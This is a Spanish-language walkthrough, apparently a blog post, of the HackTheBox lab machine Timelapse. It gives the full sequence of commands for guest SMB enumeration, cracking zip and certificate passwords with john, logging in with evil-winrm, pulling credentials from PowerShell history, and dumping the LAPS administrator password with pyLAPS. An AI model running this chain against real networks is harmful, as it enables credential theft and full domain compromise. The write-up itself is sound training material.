# Resolución maquina tombwatcher

**Autor:** PepeMaquina  
**Fecha:** 04 de octubre de 2025  
**Dificultad:** Easy 
**Sistema Operativo:** Windows  
**Tags:** Enumeration, Winrm, LPAS

---

## Imagen de la Máquina
![[timelapse.jpg]]
*Imagen: timelapse.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.152 -oG networked 
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693 10.10.11.152 -oN targeted
~~~
### Enumeración de Servicios

~~~bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-05 02:36:29Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-10-05T02:38:09+00:00; +8h00m18s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-05T02:37:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m17s, deviation: 0s, median: 8h00m17s
~~~
### Enumeración de nombre del dominio
En este apartado, se realizó la enumeración del nombre de dominio y host con la herramienta netexec y las credenciales nulas.
~~~ bash
sudo netexec smb 10.10.11.152 -u '' -p ''                                    
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\:
~~~
Con ello ya guardamos la ip y el dominio con su respectivo host
~~~ bash
cat /etc/hosts
127.0.0.1       localhost
<SNIP>
10.10.11.35 timelapse.htb dc01 dc01.timelapse.htb
~~~
### Enumeración detallada de los servicios 
En esta ocasión no se presento ninguna credencial valida, por lo que se realizara una enumeración exhaustiva con credenciales tanto nulas como guest.
Primero realizando una enumeracion con credenciales nulas no da resultado alguno.
~~~bash
sudo netexec smb 10.10.11.152 -u '' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\: 
SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
~~~
Luego se enumera con credenciales guest
~~~bash
sudo netexec smb 10.10.11.152 -u 'as' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)                                                                                                                                                        
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\as: (Guest)
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
~~~
Se puede ver que se tiene un recurso compartido interesante al que se puede leer como "Shares", para ello se procede a ver que contiene y descargar los mas importante.
~~~bash
smbclient -U 'asd' //10.10.11.152/Shares
Password for [WORKGROUP\asd]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1287617 blocks available
~~~
Como se puede ver, se tienen dos carpetas de la cual Dev es el mas interesante, pero como siempre hago, descargo todo lo que veo para ver si puedo encontrar algo de información que me podría ayudar mas adelante.
~~~
smb: \> cd Dev\
lssmb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1272260 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \Dev\> cd ..
smb: \> cd HelpDesk\
lsmb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1270183 blocks available
smb: \HelpDesk\> mget *
Get file LAPS.x64.msi? y
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (348.9 KiloBytes/sec) (average 236.6 KiloBytes/sec)
Get file LAPS_Datasheet.docx? y
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (66.4 KiloBytes/sec) (average 194.2 KiloBytes/sec)
Get file LAPS_OperationsGuide.docx? y
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (326.9 KiloBytes/sec) (average 225.7 KiloBytes/sec)
Get file LAPS_TechnicalSpecification.docx? y
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (50.9 KiloBytes/sec) (average 199.9 KiloBytes/sec)
smb: \HelpDesk\> exit
~~~
De esa forma se obtuvieron archivos que pueden ser interesantes para la explotación de la maquina.
### Ingreso con claves secretas
Al intentar leer el contenido de "winrm_backup.zip" se puede notar que esta pide una contraseña, por lo que se utiliza la herramienta de john para sacar el hash y poder descifrarlo con el mismo john.
~~~bash
zip2john winrm_backup.zip > hash_winrmzip
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

sudo john hash_winrmzip --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<Encuentre su contraseña>    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-10-04 14:47) 2.083g/s 7236Kp/s 7236Kc/s 7236KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
Al descomprimir el contenido se puede ver un archivo .pfx, por experiencia parece ser un certificado,
~~~bash
unzip winrm_backup.zip                                          
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    

ls
legacyy_dev_auth.pfx  winrm_backup.zip
~~~
yo pensé que solo se utilizaban en adcs, pero luego pensé, por lo visto en el escaneo de nmap, solo se tenia abierto el puerto 5986 que es winrm por SSL, asi que creo que solo existirian dos formas de entrar:
- Mediante la explotación de una vulnerabilidad de algun servicio.
- Mediante ciertas claves para entrar por winrm SSL (asi como id_rsa en ssh).
Habiendo encontrado un certificado y teniendo en cuentas el nombre del archivo zip "winrm_backup" me declinare a la segunda opción, asi que realizando una investigación encontre algo interesante, con el certificado y usando herramientas como openssl se puede obtener la clave privada y clave publica para poder ingresar por winrm.
~~~bash
openssl pkcs12 -in legacyy_dev_auth.pfx -out certificado_salida.cer -nokeys 
Enter Import Password:
Can't read Password
~~~
Como se puede ver, esto pide una contraseña, por lo que se utilizara otra herramienta de la familia de john como pfx2john.
~~~
pfx2john legacyy_dev_auth.pfx > hash_pfx                                   
                                                                   
sudo john hash_pfx --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<Encuentre su contraseña>       (legacyy_dev_auth.pfx)     
1g 0:00:03:38 DONE (2025-10-04 16:22) 0.004581g/s 14805p/s 14805c/s 14805C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
Ahora si colocando la contraseña se obtiene tanto la llave privada como la publica para despues entrar por winrm.
~~~
openssl pkcs12 -in legacyy_dev_auth.pfx -out certificado_salida.cer -nokeys

openssl pkcs12 -in legacyy_dev_auth.pfx -out privateKey.key -nocerts -nodes
~~~
Con eso ya tenemos las claves, ahora solo queda probar si es posible entrar con ello.

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con ello se intenta ingresar por winrm utilizando la opcion de ssl (-S), en el nombre del archivo .pfx se ve en nombre de "legacyy" por lo que estimo que ese debe ser el dueño del certificado.
~~~bash
evil-winrm -S -i 10.10.11.152 -u legacyy -c certificado_salida.cer -k privateKey.key

*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> cd desktop
*Evil-WinRM* PS C:\Users\legacyy\desktop> ls


    Directory: C:\Users\legacyy\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/4/2025   7:34 PM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\desktop> type user.txt
<Encuentre su user flag>
~~~

---
## Escalada de Privilegios

### Enumeración de permisos
Revisando los privilegios del usuario basicos, no se pudo encontrar, por lo que se recurrio a winpeas64.exe, gracias a ello se pudo encontrar que se puede leer el historial de powershell, asi que se procede a leerlo.
~~~powershell
*Evil-WinRM* PS C:\users\legacyy\> type appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3<SNIP>aV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
~~~
Esto parece tener las credenciales de otro usuario llamado svc_deploy.

### Pivoteo a otro usuario
Se intenta probar las credenciales obtenidas intentando obtener acceso mediante ese usuario.
~~~powershell
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3<SNIP>aV' -S

*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
~~~
Por suerte se obtuvo el acceso, ahora volviendo a realizar la enumeración básica, se pudo notar algo interesante.
~~~powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
<SNIP>
~~~
Se puede ver que este usuario pertenece al grupo "TIMELAPSE\LAPS_Readers" que parece estar relacionado con los archivos de recursos compartidos encontrados en los archivos del recurso compartido.
LPAS es un grupo interesante porque es el "local administration password solution", en teoría con este grupo se puede ver y sacar backups de la cuenta de administrador local, para ello existe un repositorio en github que aprovecha esta vulnerabilidad (https://github.com/p0dalirius/pyLAPS)
~~~bash
python3 pyLAPS.py --action get -u 'svc_deploy' -d 'timeslapse.htb' -p 'E3<SNIP>aV' --dc-ip 10.10.11.152 
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : ++0a<SNIP>0;N)
[+] All done!
~~~
Finalmente se logro obtener credenciales para el administrador local.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Comprobando la contraseña obtenida, se puede iniciar sesión con winrm para obtener la root flag.
~~~powershell
sudo netexec winrm 10.10.11.152 -u administrator -p '++0<SNIP>0;N)'
WINRM-SSL   10.10.11.152    5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM-SSL   10.10.11.152    5986   DC01             [+] timelapse.htb\administrator:++0<SNIP>0;N) (Pwn3d!)


evil-winrm -i 10.10.11.152 -u administrator -p '++0<SNIP>0;N)' -S 
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls
~~~
Ups, al parecer la bandera no esta en el usuario como administrator, pero buscando en los demás usuarios por fin se la encontró.
~~~
*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ..
cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd TRX
*Evil-WinRM* PS C:\Users\TRX> cd desktop
ls
*Evil-WinRM* PS C:\Users\TRX\desktop> ls

    Directory: C:\Users\TRX\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/4/2025   7:34 PM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\desktop> type root.txt
<Encuentre su root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

